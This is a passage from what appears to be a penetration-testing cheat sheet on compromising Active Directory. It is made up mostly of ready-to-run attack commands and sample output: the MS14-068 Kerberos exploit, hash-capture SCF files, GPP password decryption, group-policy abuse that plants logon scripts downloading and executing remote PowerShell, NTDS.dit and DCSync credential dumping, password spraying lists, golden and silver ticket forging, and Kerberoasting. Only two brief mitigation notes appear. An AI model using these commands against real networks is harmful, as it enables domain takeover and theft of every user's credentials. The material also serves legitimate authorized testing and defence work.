Add-LabMachineDefinition -Name FirstServer -OperatingSystem &#x27;Windows Server 2016 SERVERSTANDARD&#x27;
Install-Lab
Show-LabDeploymentSummary</code></pre></li></ul><h2 id="09f62876-8e87-4179-8c53-6202cc32cc9a" class="">Most common paths to AD compromise</h2><h3 id="f427e806-1362-4705-88f0-47805bba8b32" class="">MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)</h3><p id="7dd6dc55-c88f-40c3-af38-5201b66f1535" class="">This exploit require to know the user SID, you can use <code>rpcclient</code> to remotely get it or <code>wmi</code> if you have an access on the machine.</p><pre id="3d895c56-1c16-466e-bda1-3bc3e04a87c4" class="code"><code># remote
rpcclient $&gt; lookupnames john.smith
john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)

# loc
wmic useraccount get name,sid
Administrator  S-1-5-21-3415849876-833628785-5197346142-500   
Guest          S-1-5-21-3415849876-833628785-5197346142-501   
Administrator  S-1-5-21-297520375-2634728305-5197346142-500   
Guest          S-1-5-21-297520375-2634728305-5197346142-501   
krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
lambda         S-1-5-21-297520375-2634728305-5197346142-1110 

# powerview
Convert-NameToSid high-sec-corp.localkrbtgt
S-1-5-21-2941561648-383941485-1389968811-502</code></pre><pre id="4f5cdd06-1a1f-49d4-b094-224ce4f4483b" class="code"><code>Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068</code></pre><p id="6348a333-af00-4647-a458-f5ca0413aa58" class="">Generate a ticket with <code>metasploit</code> or <code>pykek</code></p><pre id="949ecbd8-afcf-4cd8-aa70-fc955949642b" class="code"><code>Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
   Name      Current Setting                                Required  Description
   ----      ---------------                                --------  -----------
   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex: DEMO.LOCAL
   PASSWORD  P@ssw0rd                                       yes       The Domain User password
   RHOSTS    10.10.10.10                                    yes       The target address range or CIDR identifier
   RPORT     88                                             yes       The target port
   Timeout   10                                             yes       The TCP timeout to establish connection and read data
   USER      lambda                                         yes       The Domain User
   USER_SID  S-1-5-21-297520375-2634728305-5197346142-1106  yes       The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000</code></pre><pre id="ce299734-8d70-41f8-91cd-ec028ed845be" class="code"><code># Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
$ git clone https://github.com/SecWiki/windows-kernel-exploits
$ python ./ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt; -p &lt;clearPassword&gt;
$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066
-1105
  [+] Building AS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!
  [+] Building TGS-REQ for msfdc01.metasploitable.local... Done!
  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!
  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
  [+] Creating ccache file &#x27;TGT_user01@metasploitable.local.ccache&#x27;... Done!</code></pre><p id="a18aa81f-0a0a-4392-8d26-8352d320229e" class="">Then use <code>mimikatz</code> to load the ticket.</p><pre id="1673eb4f-14b4-4340-83f7-31ce3524e796" class="code"><code>mimikatz.exe &quot;kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache&quot;</code></pre><p id="483cda86-cd32-4cd0-9f2e-fe87ab0e83ea" class="">‚ö†Ô∏è If the clock is skewed use <code>clock-skew.nse</code> script from <code>nmap</code></p><pre id="b4e26612-e022-4e85-809a-dea026b5255e" class="code"><code>Linux&gt; $ nmap -sV -sC 10.10.10.10
clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s

Linux&gt; sudo date -s &quot;14 APR 2015 18:25:16&quot; 
Windows&gt; net time /domain /set</code></pre><h3 id="35a5c65d-9cd0-4bf5-a624-743833901b3f" class="">Mitigations</h3><ul id="f092461d-e35e-48b5-8e43-9bb7c7e43471" class="bulleted-list"><li>Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780</li></ul><h3 id="18930913-1a6a-4daf-87ab-42a3c1e7f989" class="">Open Shares</h3><pre id="dc2229ea-7073-4c7e-bb90-5caf7eebca06" class="code"><code>smbmap -H 10.10.10.10                # null session
smbmap -H 10.10.10.10 -R             # recursive listing
smbmap -H 10.10.10.10 -u invaliduser # guest smb session
smbmap -H 10.10.10.10 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18</code></pre><p id="b4ab941f-c5b7-4868-87a3-8ddb12822df6" class="">or</p><pre id="63ec79c7-1cca-4b90-b206-31ae71816753" class="code"><code>pth-smbclient -U &quot;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A&quot; //192.168.10.100/Share
pth-smbclient -U &quot;AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A&quot; //192.168.10.100/C$
ls  # list files
cd  # move inside a folder
get # download files
put # replace a file</code></pre><p id="8ec9c528-a764-409b-84d2-de6605b709ca" class="">or</p><pre id="7f1d05d8-be43-4f22-9782-9ef4c6bcd09a" class="code"><code>smbclient -I 10.10.10.100 -L ACTIVE -N -U &quot;&quot;
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk      
        SYSVOL          Disk      Logon server share
        Users           Disk
use Sharename # select a Sharename
cd Folder     # move inside a folder
ls            # list files</code></pre><p id="c53aec8e-d683-44dd-a727-afb445a2d11b" class="">Download a folder recursively</p><pre id="341003d1-06e9-4b53-b5a7-890766dd573f" class="code"><code>smbclient -U username //10.0.0.1/SYSVOL
smbclient //10.0.0.1/Share
smb: \&gt; mask &quot;&quot;
smb: \&gt; recurse ON
smb: \&gt; prompt OFF
smb: \&gt; lcd &#x27;/path/to/go/&#x27;
smb: \&gt; mget *</code></pre><p id="a7a2dcf0-e4dc-469b-b607-c5a86594a62e" class="">Mount a share</p><pre id="2279f694-513b-48e3-8e80-070b1971e1c1" class="code"><code>smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
sudo mount -t cifs -o username=&lt;user&gt;,password=&lt;pass&gt; //&lt;IP&gt;/Users folder</code></pre><h3 id="37bf9aa9-e68d-49d1-902b-565f43f0da44" class="">SCF and URL file attack against writeable share</h3><p id="d51cb644-99a8-47c7-97bc-713626107d0b" class="">Drop the following <code>@something.scf</code> file inside a share and start listening with Responder : <code>responder -wrf --lm -v -I eth0</code></p><pre id="7b9d3f5e-5c68-4902-9c61-4d4a59fb797d" class="code"><code>[Shell]
Command=2
IconFile=\\10.10.XX.XX\Share\test.ico
[Taskbar]
Command=ToggleDesktop</code></pre><p id="e9f0cf77-f3c0-422d-975d-0993e7e08456" class="">This attack also works with <code>.url</code> files and <code>responder -I eth0 -v</code>.</p><pre id="ccd4333e-c63f-4520-899f-773dfefc8591" class="code"><code>[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\192.168.1.29\%USERNAME%.icon
IconIndex=1</code></pre><h3 id="afb17c48-43c5-4ce4-96b7-4bfaf4e3a920" class="">Passwords in SYSVOL &amp; Group Policy Preferences</h3><p id="a2e1e91f-e781-40ea-aea9-aea9cb1692e9" class="">üö© GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local</p><p id="7762da59-b864-4920-bb6f-e98bff195e56" class="">Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>.</p><pre id="94ee33e3-a433-495c-b443-a72da3402281" class="code"><code>findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</code></pre><p id="16bf406e-c423-47c7-9ffc-4ba72c38f19d" class="">Decrypt a Group Policy Password found in SYSVOL (by <a href="https://twitter.com/0x00C651E0/status/956362334682849280">0x00C651E0</a>), using the 32-byte AES key provided by Microsoft in the <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx">MSDN - 2.2.1.1.4 Password Encryption</a></p><pre id="3f28a958-ffa0-4350-8cef-a51dbc3597ea" class="code"><code>echo &#x27;password_in_base64&#x27; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

e.g: 
echo &#x27;5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=&#x27; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

echo &#x27;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#x27; | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000</code></pre><h3 id="c1b3796a-409a-41b6-9381-9e0ea900d846" class="">Automate the SYSVOL and passwords research</h3><ul id="89b9faff-53f4-4bc0-9796-aff837b54289" class="bulleted-list"><li>Metasploit modules to enumerate shares and credentials<pre id="1eb392c7-d065-4c47-ab2e-9c7d13d55c17" class="code"><code>scanner/smb/smb_enumshares
post/windows/gather/enum_shares
post/windows/gather/credentials/gpp</code></pre></li></ul><ul id="050d828a-9406-4af6-8824-57e6f256f333" class="bulleted-list"><li>Crackmapexec modules<pre id="0016229c-673f-4641-92c7-aca479abf16e" class="code"><code>cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_autologin
cme smb 192.168.1.2 -u Administrator -H 89[...]9d -M gpp_password</code></pre></li></ul><p id="156d5043-bfc4-4230-8b35-778fc5c7dc80" class="">List all GPO for a domain</p><pre id="19b2fc4c-5fa2-418d-83b1-b0612a7bfe60" class="code"><code>Get-GPO -domaine DOMAIN.COM -all
Get-GPOReport -all -reporttype xml --all

Powersploit:
Get-NetGPO
Get-NetGPOGroup</code></pre><h3 id="f925b181-ec0e-4832-ae67-83c24408e911" class="">Mitigations</h3><ul id="8b6e14f3-7fcb-472d-916b-612709c6593e" class="bulleted-list"><li>Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.</li></ul><ul id="d7a74f62-972f-4e51-a085-f7a5a711d016" class="bulleted-list"><li>Delete existing GPP xml files in SYSVOL containing passwords.</li></ul><ul id="76d6ffb0-d2a3-4ec4-83bd-7aa540ad7844" class="bulleted-list"><li>Don‚Äôt put passwords in files that are accessible by all authenticated users.</li></ul><h3 id="1f558109-635d-42e3-bf3a-40737d13d426" class="">Exploit Group Policy Objects GPO</h3><pre id="cdbcd5bb-4dae-41d5-aed1-18f40a84817f" class="code"><code># Adding User Rights
SharpGPOAbuse.exe --AddUserRights --UserRights &quot;SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight&quot; --UserAccount bob.smith --GPOName &quot;Vulnerable GPO&quot;

# Adding a Local Admin
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName &quot;Vulnerable GPO&quot;

# Configuring a User or Computer Logon Script
SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.1.1.10:80/a&#x27;))\&quot;&quot; --GPOName &quot;Vulnerable GPO&quot;

# Configuring a Computer or User Immediate Task
SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;Update&quot; --Author DOMAIN\Admin --Command &quot;cmd.exe&quot; --Arguments &quot;/c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.1.1.10:80/a&#x27;))\&quot;&quot; --GPOName &quot;Vulnerable GPO&quot;</code></pre><h3 id="cdfeb601-c689-4a3a-8c61-297aa2526578" class="">Dumping AD Domain Credentials</h3><p id="2f928c72-2b55-48e9-94c0-bd1d578d7c89" class="">You will need the following files to extract the ntds :</p><ul id="442c64b9-422f-4f69-808c-931c27ddc804" class="bulleted-list"><li>ntds file (C:\Windows\NTDS\ntds.dit)</li></ul><ul id="ad049b6a-39c6-4497-943c-f9d2b95d4690" class="bulleted-list"><li>SYSTEM hive (C:\Windows\System32\SYSTEM)</li></ul><h3 id="c4b2527e-391c-4423-88f1-1add1203a456" class="">Using ndtsutil</h3><pre id="4e414e0d-4811-469d-942b-4afae96a6708" class="code"><code>C:\&gt;ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit</code></pre><p id="481ce150-5b7b-43bc-bfaf-44356232efb9" class="">or</p><pre id="3dcf3693-219c-4f75-8e59-1c1ccaa2a761" class="code"><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q q</code></pre><h3 id="62651bea-5a25-4d36-bc85-a49fb5c1c35b" class="">Using Vshadow</h3><pre id="631e41b4-6e5b-4465-a3c2-e4591943c47b" class="code"><code>vssadmin create shadow /for=C :
Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit</code></pre><p id="71bf2d26-263a-4087-9f25-8966d2b63ab1" class="">You can also use the Nishang script, available at : <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p><pre id="51f6f869-436b-47f1-822e-ff94ea5a1b47" class="code"><code>Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\</code></pre><h3 id="62190daa-51ea-447d-bc56-34aa67c81884" class="">Using vssadmin</h3><pre id="eea55e44-d313-4d83-aa89-a45fa1292bba" class="code"><code>vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy</code></pre><h3 id="d95683d8-ba03-4e2d-84e4-b9a732ef2d39" class="">Using DiskShadow (a Windows signed binary)</h3><pre id="0b5cd038-426c-48fd-9bb1-bcfd99e9b1a6" class="code"><code>diskshadow.txt contains :
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec &quot;cmd.exe&quot; /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset

then:
NOTE - must be executed from C:\Windows\System32
diskshadow.exe /s  c:\diskshadow.txt
dir c:\exfil
reg.exe save hklm\system c:\exfil\system.bak</code></pre><h3 id="3059f371-2fe0-4a8b-a6b8-7e73ac28a62b" class="">Using esentutl.exe</h3><p id="ef812547-1cbe-4746-a4bf-9d5d04468c09" class="">Copy/extract a locked file such as the AD Database</p><pre id="a3afb11c-f06f-48bb-9350-37a8998e919a" class="code"><code>esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit</code></pre><h3 id="6f808143-896c-4220-a9fa-e530bcac65f0" class="">Extract hashes from ntds.dit</h3><p id="3cfcb4b8-5eeb-4c79-bb9c-31bb43976bc8" class="">then you need to use secretsdump to extract the hashes, use the <code>LOCAL</code> options to use it on a retrieved ntds.dit</p><pre id="d23f8e59-2e4a-431e-9188-0ad487621799" class="code"><code>secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL</code></pre><p id="49b0dbea-dfcc-4787-b636-a390a7898da7" class="">secretsdump also works remotely</p><pre id="33d5ddc6-1099-4674-a781-24b6993b8fa9" class="code"><code>./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss
./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1</code></pre><h3 id="2f520718-c5d5-4a38-9e00-c55cef8e12c9" class="">Alternatives - modules</h3><p id="d8a06a35-ed04-4bb5-8884-b2046a1a4b0a" class="">Metasploit modules</p><pre id="93198ad4-2acf-48e2-9d91-17dcd982d52e" class="code"><code>windows/gather/credentials/domain_hashdump</code></pre><p id="ef232c82-605d-4ae3-b633-668ff05ae13b" class="">PowerSploit module</p><pre id="c824154c-2d9c-4161-8887-0f5fcc020a2b" class="code"><code>Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit</code></pre><p id="39cc1e7e-1c9f-478a-9cbd-15edd8390af6" class="">CrackMapExec module</p><pre id="8390cd3a-63a8-413b-a7e4-029314d52df9" class="code"><code>cme smb 10.10.0.202 -u username -p password --ntds vss
cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default</code></pre><h3 id="fa24d108-2ebc-4a23-a64e-a9278d321cf9" class="">Using Mimikatz DCSync</h3><p id="4d150562-0351-466f-bc44-95fa36b515c5" class="">Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.</p><pre id="57c66438-c590-4e28-ac5f-c3a0936aed27" class="code"><code>mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt</code></pre><p id="c5376204-d8a3-4a36-a776-5d92cdbf7be2" class="">‚ö†Ô∏è Read-Only Domain Controllers are not allowed to pull password data for users by default.</p><h3 id="bc669745-c7e4-42b0-a6c9-96f640bb83fd" class="">Using Mimikatz sekurlsa</h3><p id="0f285bef-375a-411a-bc35-6f5340b87bcd" class="">Dumps credential data in an Active Directory domain when run on a Domain Controller. ‚ö†Ô∏è Requires administrator access with debug or Local SYSTEM rights</p><pre id="8bc79742-a9a2-46be-8513-8251b0fb9634" class="code"><code>sekurlsa::krbtgt
lsadump::lsa /inject /name:krbtgt</code></pre><h3 id="f0a3f616-fe8b-4471-8a49-709cd4044139" class="">Password spraying</h3><p id="fa859c4e-bc81-4080-af84-caf77773235c" class="">Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password.</p><blockquote id="3ab6b961-dfe7-4407-a1e0-c601161aabe2" class="">The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.</blockquote><p id="2e4153b0-dca0-47a9-8a71-5958a15b234f" class="">Most of the time the best passwords to spray are :</p><ul id="0ce056d8-5b00-4beb-b592-78beddb60b1e" class="bulleted-list"><li>P@ssw0rd01, Password123, mimikatz</li></ul><ul id="9a1bbee3-1259-434f-afe4-977f8dc7b46d" class="bulleted-list"><li>Welcome1/Welcome01</li></ul><ul id="a52abb6c-2358-41ed-b4ea-47048ae4f133" class="bulleted-list"><li>$Companyname1 : $Microsoft1</li></ul><ul id="8597867f-45d5-43fb-a3e3-113c503ecc6e" class="bulleted-list"><li>SeasonYear : Winter2019*,Spring2020!,Summer2018?</li></ul><ul id="4de943ca-a991-4c61-9a42-a655084de9dd" class="bulleted-list"><li>Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)</li></ul><h3 id="fbe4435f-44eb-4930-8199-4247cdf7d08a" class="">Kerberos pre-auth bruteforcing</h3><p id="14201165-3e14-4b4b-bb97-52b3f1c6df1a" class="">Using <code>kerbrute</code>, a tool to perform Kerberos pre-auth bruteforcing.</p><blockquote id="8834db42-a20a-4a48-881d-f0ea21c23f6e" class="">Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).</blockquote><pre id="811232da-95d0-441b-a1bd-96ddb28affa4" class="code"><code>root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt</code></pre><h3 id="6684e504-b48e-4303-8cb6-e7b5f719184a" class="">Spray a pre-generated passwords list</h3><p id="a2eef28d-dcef-40d3-9082-e1c897ce759e" class="">Using <code>crackmapexec</code> and <code>mp64</code> to generate passwords and spray them against SMB services on the network.</p><pre id="6f9fa8c5-290b-4205-bdfb-a2514681e767" class="code"><code>crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`</code></pre><h3 id="698494a9-9013-4743-ac92-a9afb6cae7b2" class="">Spray passwords against the RDP service</h3><p id="2467850d-b8a9-45a0-8130-ea5471f61f11" class="">Using RDPassSpray to target RDP services.</p><pre id="ccaed02e-1748-4695-8a71-3a6c42874a9f" class="code"><code>git clone https://github.com/xFreed0m/RDPassSpray
python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]</code></pre><p id="365967d2-495a-42dc-b0df-a2199847f2cd" class="">Using hydra and ncrack to target RDP services.</p><pre id="a691b802-5ce2-44ea-9358-9d21325a7d05" class="code"><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
ncrack ‚Äìconnection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10</code></pre><h3 id="f415a9b0-8fee-4748-ba27-9e04ed5bb284" class="">Password in AD User comment</h3><pre id="39f292c9-c516-4201-bddd-aa713f936e1f" class="code"><code>enum4linux | grep -i desc
There are 3-4 fields that seem to be common in most AD schemas: 
UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.

Get-WmiObject -Class Win32_UserAccount -Filter &quot;Domain=&#x27;COMPANYDOMAIN&#x27; AND Disabled=&#x27;False&#x27;&quot; | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID</code></pre><p id="080bed75-2a05-4519-9e72-f763a380836b" class="">or dump the Active Directory and <code>grep</code> the content.</p><pre id="530dd20c-ee97-4bf3-8566-1a32bfbbd1e7" class="code"><code>ldapdomaindump -u &#x27;DOMAIN\john&#x27; -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/</code></pre><h3 id="ae8e48f0-184e-45e9-a824-df7360a0b568" class="">Pass-the-Ticket Golden Tickets</h3><p id="dc830e5a-6041-4c20-b9fa-6c7e6849382a" class="">Forging a TGT require the krbtgt NTLM hash</p><blockquote id="296eed6b-8e29-42a4-a9cc-dadc0e0810a6" class="">The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.</blockquote><h3 id="9d018f82-4fc6-4e76-83d5-743a852dd4b1" class="">Using Mimikatz</h3><pre id="bce59d59-39c1-43b9-9818-88fa7030d6c1" class="code"><code># Get info - Mimikatz
lsadump::dcsync /user:krbtgt
lsadump::lsa /inject /name:krbtgt

# Forge a Golden ticket - Mimikatz
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt</code></pre><h3 id="4a69477d-3a11-4b8b-924a-c16052aaa61d" class="">Using Meterpreter</h3><pre id="6b768549-2cc7-4196-af23-0c1a27c0222b" class="code"><code># Get info - Meterpreter(kiwi)
dcsync_ntlm krbtgt
dcsync krbtgt

# Forge a Golden ticket - Meterpreter
load kiwi
golden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
kerberos_ticket_purge
kerberos_ticket_use /root/Downloads/pentestlabuser.tck
kerberos_ticket_list</code></pre><h3 id="64785234-f66a-4259-b7f2-03e5411b13e2" class="">Using a ticket on Linux</h3><pre id="31dbc9a4-3cc2-43f8-8157-d04320b64216" class="code"><code># Convert the ticket kirbi to ccache with kekeo
misc::convert ccache ticket.kirbi

# Alternatively you can use ticketer from Impacket
./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da

ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519

export KRB5CCNAME=/home/user/ticket.ccache
cat $KRB5CCNAME

# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100</code></pre><p id="1431a3ff-cf47-41a7-a9ef-2835b3542a99" class="">If you need to swap ticket between Windows and Linux, you need to convert them with <code>ticket_converter</code> or <code>kekeo</code>.</p><pre id="38f281b3-d833-4d4d-a705-cd76ebbf3404" class="code"><code>root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache =&gt; kirbi
root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi =&gt; ccache</code></pre><h3 id="c01b9937-37a3-47b7-8e3a-a137d741c4f2" class="">Pass-the-Ticket Silver Tickets</h3><p id="1f5dbeab-13a3-493f-acba-767aa392c674" class="">Forging a TGS require machine accound password (key) or NTLM hash from the KDC</p><pre id="d8caa3e8-50a5-4eaf-bebf-f27f1da96cec" class="code"><code># Create a ticket for the service
mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE

# Examples
mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt
mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park

# Then use the same steps as a Golden ticket
mimikatz $ misc::convert ccache ticket.kirbi

root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100</code></pre><h3 id="a157ca5b-5207-4b06-89cb-65acbfd4e855" class="">Kerberoasting</h3><blockquote id="0194e390-fcbd-43d7-8e8a-e3876b855ef1" class="">&quot;A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. &quot; - MSDN</blockquote><p id="3e4ce478-1941-4870-9710-d0bc15914959" class="">Any valid domain user can request a kerberos ticket (TGS) for any domain service with <code>GetUserSPNs</code>. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.</p><pre id="48f7c126-a330-4f57-80f6-fed9c8d0f688" class="code"><code>$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43c360c29c154b012c$c54c7be163ae6c323ae6b5fc45a1eacee2f4903deec785cd689f4551e023775c7e7772fe85e3fb8374ca95534d72c971ba80e8b6d4ef3c3b8439dc54031540133cbcbd5f7b39d622733d198eec594c0cd181ab4696a6ad12744d1ddd2d3e2c6dd33b4daedbc9cae75e8ff2652c80421b0fa3a61ddf2cabeea462c44e0f6d9a6436717e0621bb4e0fe8bd3cf36156b4b2f7b81d651f70baf34a0b3071858b5034b895c25a0d3c67044c849d5952c381a0078a86ae562810a93d9c7bcc8311255cc9eda35a9c4d4d43ff1cc29108056285c954f3c633332ff0cb0c9c0f1896c792b247c8d25f5dd71802728fc99bb22709337b5596ab0e2045110b0b005b03351e9f71a65b48e8259f6191ce95d4e5794846c61c3abccf0f5f72a8679fb0dc0777720f5551ad99c9c9ab0955f85ee211d40b01fcaece7868960b2063923aa0f59e17b347f3308087707e95cad54b9df8179728821cf54cb204c5c2e571d9a66c8ec40b090305aa32e90a90d25ea37be6d8f8a83c683a8b69d386f9edb970596bc56fa02971f69c7e073b8de1213d9caa75ab652e5c5b99cadace9dd7d15d1d530309ea39ca1b7c6009ae3342796a6bdea084622ee95cbade437659e37363b848bad2186e3a9f7dec66e1e496db32d55eda8fb926f057996638646dcc662ed226788ddf36304dc70eaca91b26cb7180341f417fad91117ee10212c69423abd42